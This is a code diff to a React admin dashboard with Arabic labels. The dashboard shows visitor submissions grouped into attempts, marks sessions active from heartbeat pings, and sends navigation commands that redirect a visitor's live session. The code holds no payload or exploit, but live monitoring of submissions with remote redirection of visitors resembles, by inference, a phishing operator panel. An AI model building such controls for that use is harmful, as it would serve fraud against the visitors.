@@ -3,6 +3,7 @@ import { useLocation } from "wouter";
 import { getToken, logoutAdmin } from "@/lib/auth";
 import { getAdminStats, listAdminSubmissions, sendAdminControl, adminLogoutAll, adminChangePassword, getAllAdminSubmissions, getAdminSubmissionsFromSupabase, sendNavigationCommand, type NavigationAction } from "@/lib/api";
 import { getAdminSettings, saveAdminSettings, getBlockedSessions, blockSession, unblockSession, getTrashItems, moveSubmissionToTrash, restoreTrashItem, deleteTrashItem, clearTrash } from "@/lib/admin-store";
+import { getPageName } from "@/lib/heartbeat";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
@@ -61,7 +62,7 @@ interface AttemptBlock {
 }
 
 const ATTEMPT_GAP_MS = 10 * 60 * 1000; // 10 minutes gap to split attempts
-const ACTIVE_THRESHOLD_MS = 10 * 1000; // 10 seconds for real-time active check
+const ACTIVE_THRESHOLD_MS = 30 * 1000; // 30 seconds for real-time active check
 
 // Live counter hook - updates every second for real-time display
 function useLiveCounter(baseTimestamp: string | null) {
@@ -199,14 +200,11 @@ function groupIntoAttemptBlocks(rows: SubmissionRow[]): AttemptBlock[] {
     }
   }
 
-  // Mark the most recent block as active (if within 5 minutes)
+  // Mark the most recent block as active - this will be updated based on lastPing in SessionBox
+  // For now, we don't set isActive here - it will be set based on ping data in SessionBox
   if (blocks.length > 0) {
-    const latestBlock = blocks[blocks.length - 1];
-    const latestTime = new Date(latestBlock.startTime).getTime();
-    const now = Date.now();
-    if (now - latestTime < ACTIVE_THRESHOLD_MS) {
-      latestBlock.isActive = true;
-    }
+    // isActive will be determined by the SessionBox based on lastPing
+    // We just need to ensure the blocks are sorted correctly
   }
 
   return blocks;
@@ -276,6 +274,7 @@ function AttemptBlockCard({
   onControl,
   loadingAction,
   isLatest,
+  isActive,
   currentPage,
   sessionId,
 }: {
@@ -283,6 +282,7 @@ function AttemptBlockCard({
   onControl: (sessionId: string, action: string) => Promise<void>;
   loadingAction: string | null;
   isLatest: boolean;
+  isActive: boolean;
   currentPage?: string;
   sessionId: string;
 }) {
@@ -303,14 +303,14 @@ function AttemptBlockCard({
   );
 
   return (
-    <div className={`rounded-3xl border p-4 ${block.isActive ? "border-green-300 bg-green-50/50" : "border-slate-200 bg-white"}`}>
+    <div className={`rounded-3xl border p-4 ${isActive ? "border-green-300 bg-green-50/50" : "border-slate-200 bg-white"}`}>
       {/* Attempt Header */}
       <div className="flex items-center justify-between mb-3">
         <div className="flex items-center gap-2">
-          <span className={`text-xs font-bold px-2 py-1 rounded-full ${block.isActive ? "bg-green-100 text-green-700" : "bg-slate-100 text-slate-600"}`}>
+          <span className={`text-xs font-bold px-2 py-1 rounded-full ${isActive ? "bg-green-100 text-green-700" : "bg-slate-100 text-slate-600"}`}>
             المحاولة #{block.attemptNumber}
           </span>
-          {block.isActive && (
+          {isActive && (
             <span className="flex items-center gap-1 text-xs text-green-600">
               <span className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
               نشط
@@ -616,17 +616,24 @@ function SessionBox({
             ) : (
               <div className="space-y-3">
                 {/* Render blocks in reverse order (latest first) */}
-                {[...attemptBlocks].reverse().map((block, index) => (
-                  <AttemptBlockCard
-                    key={block.attemptNumber}
-                    block={block}
-                    onControl={handleBlockControl}
-                    loadingAction={loadingAction}
-                    isLatest={index === 0}
-                    currentPage={currentPage}
-                    sessionId={sessionId}
-                  />
-                ))}
+                {/* Determine if session is active based on lastPing (within 30 seconds) */}
+                {(() => {
+                  const isSessionActive = lastPing 
+                    ? (Date.now() - new Date(lastPing).getTime() <= ACTIVE_THRESHOLD_MS)
+                    : false;
+                  return [...attemptBlocks].reverse().map((block, index) => (
+                    <AttemptBlockCard
+                      key={block.attemptNumber}
+                      block={block}
+                      onControl={handleBlockControl}
+                      loadingAction={loadingAction}
+                      isLatest={index === 0}
+                      isActive={isSessionActive}
+                      currentPage={currentPage}
+                      sessionId={sessionId}
+                    />
+                  ));
+                })()}
               </div>
             )}
 
@@ -905,7 +912,13 @@ export default function AdminDashboard() {
 
   // Handle redirect/navigation commands
   const handleRedirect = useCallback(async (sessionId: string, target: NavigationAction) => {
-    await sendNavigationCommand(sessionId, target);
+    console.log("📤 handleRedirect called:", { sessionId, target });
+    try {
+      const result = await sendNavigationCommand(sessionId, target);
+      console.log("✅ Navigation command result:", result);
+    } catch (err) {
+      console.error("❌ handleRedirect error:", err);
+    }
   }, []);
 
   const blockedMap = useMemo(() => Object.fromEntries(blockedSessions.map((entry) => [entry.sessionId, entry])), [blockedSessions]);
